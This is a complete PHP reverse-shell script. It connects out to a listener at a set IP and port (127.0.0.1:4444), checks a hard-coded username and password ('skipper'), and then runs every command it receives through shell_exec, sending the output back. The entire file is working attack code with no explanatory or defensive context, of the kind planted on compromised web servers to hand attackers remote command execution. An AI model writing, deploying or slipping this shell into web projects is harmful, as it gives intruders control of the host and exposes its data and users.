<?php
$ip = '127.0.0.1';
$port = 4444;
$valid_username = 'skipper';
$valid_password = 'skipper';

$sock = fsockopen($ip, $port);

if ($sock) {
    fwrite($sock, "Username: ");
    $username = fgets($sock);
    $username = trim($username);

    if ($username === $valid_username) {
        fwrite($sock, "Password: ");
        $password = fgets($sock);
        $password = trim($password);

        if ($password === $valid_password) {
            fwrite($sock, "Login successful.\n");

            while (true) {
                $cmd = fgets($sock);
                if ($cmd === false) break;
                $output = shell_exec($cmd);
                fwrite($sock, $output);
            }
        } else {
            fwrite($sock, "Invalid password.\n");
        }
    } else {
        fwrite($sock, "Invalid username.\n");
    }

    fclose($sock);
} else {
    echo "Unable to connect to $ip:$port\n";
}
?>
